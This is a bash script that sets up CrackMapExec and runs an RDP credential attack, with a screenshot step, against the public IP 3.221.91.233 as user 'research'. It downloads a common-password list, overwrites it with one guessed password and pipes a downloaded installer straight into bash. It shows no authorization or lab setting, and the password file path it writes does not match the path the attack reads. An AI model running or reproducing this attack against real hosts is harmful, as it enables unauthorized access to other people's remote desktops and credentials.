#!/bin/bash

sudo apt update; sudo apt install build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev curl git libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev
curl -fsSL https://pyenv.run | bash
exec "$SHELL"
pyenv install 3.11.12
pyenv local 3.11.12

git clone https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
python3 -m pip install pipx
python3 -m pipx install poetry

curl -LOJ https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt

echo 'SecureP@ssw0rd!' > 10-million-password-list-top-100.txt

poetry run crackmapexec rdp 3.221.91.233 -u research -p /tmp/10-million-password-list-top-100.txt --screenshot --screentime 300 --res "1024x768"